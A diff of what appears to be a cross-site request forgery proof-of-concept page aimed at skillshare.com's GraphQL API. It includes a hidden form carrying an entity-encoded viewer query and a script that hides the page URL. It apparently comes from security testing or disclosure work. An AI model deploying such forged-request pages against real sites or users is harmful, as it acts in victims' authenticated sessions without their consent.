@@ -3,7 +3,7 @@
   <body>
   <script>history.pushState('', '', '/')</script>
     <form action="https://www.skillshare.com/api/graphql">
-      <input type="hidden" name="query" value="query%20viewerContext($isAuthenticated:%20Boolean!)%20{%20viewer%20@include(if:%20$isAuthenticated)%20{%20firstName%20}%20}" />
+      <input type="hidden" name="query" value="query&#32;viewerContext&#40;&#36;isAuthenticated&#58;&#32;Boolean&#33;&#41;&#32;&#123;&#32;viewer&#32;&#64;include&#40;if&#58;&#32;&#36;isAuthenticated&#41;&#32;&#123;&#32;firstName&#32;&#125;&#32;&#125;" />
       <input type="hidden" name="variables" value="{%22isAuthenticated%22:true}" />
       <input type="submit" value="Submit request" />
     </form>
@@ -12,4 +12,4 @@
 
 
 
-https://www.skillshare.com/api/graphql?query=query%20viewerContext($isAuthenticated:%20Boolean!)%20{%20viewer%20@include(if:%20$isAuthenticated)%20{%20firstName%20}%20}&variables={%22isAuthenticated%22:true}
+
